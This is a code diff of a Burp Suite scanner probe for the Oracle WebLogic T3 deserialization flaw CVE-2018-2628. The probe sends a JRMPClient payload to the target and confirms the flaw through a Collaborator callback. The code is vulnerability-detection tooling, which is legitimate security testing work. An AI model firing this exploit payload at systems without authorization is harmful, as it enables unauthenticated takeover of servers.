@@ -1,45 +1,36 @@
 package probes;
 
 import burp.*;
+import payloads.JRMPClient;
 
-import java.io.IOException;
 import java.net.Socket;
-import java.net.URL;
-import java.util.regex.Pattern;
 
 public class CVE_2018_2628 extends Probe {
     private static final String NAME = "CVE-2018-2628";
     private static final String SEVERITY = "High";
-    private static String detail = "WebLogic has a T3 protocol vulnerability!";
+    private static final String DESC = "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Core Components). Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).";
 
     @Override
     public IScanIssue check(IHttpRequestResponse requestResponse) {
-        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
+        IHttpService service = requestResponse.getHttpService();
         String pollPayload = Utilities.collaborator.generatePayload(true);
-        boolean vulnerable = false;
-        String result = "";
         try {
-            Socket s = new Socket(target.getHost(), target.getPort());
+            Socket s = new Socket(service.getHost(), service.getPort());
             s.setSoTimeout(10);
-
-            result = sendT3Payload(s, JRMPClient.getPayloadBytes(pollPayload, "activator"));
+            sendT3Payload(s, JRMPClient.getPayloadBytes(pollPayload, "activator"));
             s.close();
         } catch (Exception e) {
-            e.printStackTrace();
+            e.printStackTrace(Utilities.err);
         }
 
-        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
-            detail = detail + "<br/>"
-                    + "Receive a " + interaction.getProperty("type")
-                    + " query from " + interaction.getProperty("client_ip")
-                    + " at " + interaction.getProperty("time_stamp");
+        String detail = Utilities.fetchInteraction(pollPayload);
 
-            vulnerable = true;
-        }
-
-//        return result.contains("weblogic.jms.common.StreamMessageImpl") ? new WebLogicIssue(requestResponse, NAME, DETAIL, SEVERITY) : null;
-        if (vulnerable) {
-            return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
+        if (detail.length() > 0) {
+            return new WebLogicIssue(
+                    requestResponse,
+                    NAME,
+                    DESC + "<br/><br/>" + detail,
+                    SEVERITY);
         } else return null;
     }
 }
